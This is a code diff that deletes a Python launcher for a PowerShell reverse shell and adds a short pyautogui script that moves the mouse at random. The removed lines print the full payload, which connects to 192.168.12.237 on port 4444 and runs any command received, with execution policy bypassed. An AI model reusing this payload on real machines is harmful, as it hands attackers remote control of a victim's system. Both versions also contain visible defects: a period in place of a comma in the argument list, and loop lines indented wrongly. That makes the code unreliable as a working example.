@@ -1,14 +1,14 @@
-import subprocess 
+import pyautogui as p
+import random
+import time
 
 
-payload = '''
-$LHOST = "192.168.12.237"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
-'''
+for i in range(10):
 
+    x= random.randint(900, 1500)
 
-subprocess.Popen([
-     "powershell".
-     "-ExecutionPolicy", "Bypass",
-       "-NoProfile", 
-       "-Command", payload
-])
+y= random.randint(400, 800)
+
+p.moveTo(x, y)
+
+time.sleep(0.2)
